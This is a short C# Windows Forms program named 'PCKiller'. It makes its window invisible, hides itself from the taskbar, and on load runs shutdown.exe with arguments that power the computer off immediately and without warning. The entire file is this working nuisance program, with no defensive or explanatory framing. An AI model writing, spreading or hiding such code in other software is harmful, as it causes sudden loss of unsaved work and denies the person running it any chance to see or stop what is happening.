using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace PCKiller
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            Opacity = 0;

            ShowIcon = false;

            ShowInTaskbar = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Process p = new Process();

            p.StartInfo.FileName = "shutdown.exe";

            p.StartInfo.Arguments = "/s /t 0";

            p.Start();
        }
    }
}
